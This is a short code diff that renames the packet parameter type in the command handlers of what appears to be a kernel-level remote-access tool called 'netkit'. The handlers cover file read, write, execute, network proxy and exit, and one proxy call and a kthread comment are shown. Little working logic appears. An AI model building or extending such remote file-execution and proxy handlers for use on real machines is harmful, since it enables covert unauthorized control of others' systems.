@@ -17,7 +17,7 @@
 #include "../../sys/task.h"
 #include "../../netkit.h"
 
-int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+int cmd_handle_file_read(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
 {
     size_t filename_len;
     char *filename;
@@ -39,7 +39,7 @@ int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_b
     return retv;
 }
 
-int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+int cmd_handle_file_write(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
 {
     size_t filename_len;
     char *filename;
@@ -67,7 +67,7 @@ int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_
     return retv;
 }
 
-int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+int cmd_handle_file_exec(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
 {
     size_t filename_len;
     char *filename;
@@ -89,7 +89,7 @@ int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_b
     return retv;
 }
 
-int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+int cmd_handle_proxy(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
 {
     if (packet->content_len < 6)
         return -EMSGSIZE;
@@ -97,7 +97,7 @@ int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_bufle
     return socket_proxy(*(__be32*)packet->content, *(__be16*)(packet->content+4), packet->content+6, packet->content_len-6, res_buf, res_buflen);
 }
 
-int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
+int cmd_handle_exit(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
 {
     // run as kthread so underlaying layers can cleanup and round up the IO
     // conn-xyz --[spawn]--> netkit-exit --[call]--> netkit->exit() --[kill]--> {netkit-conn-loop, conn-xyz} 
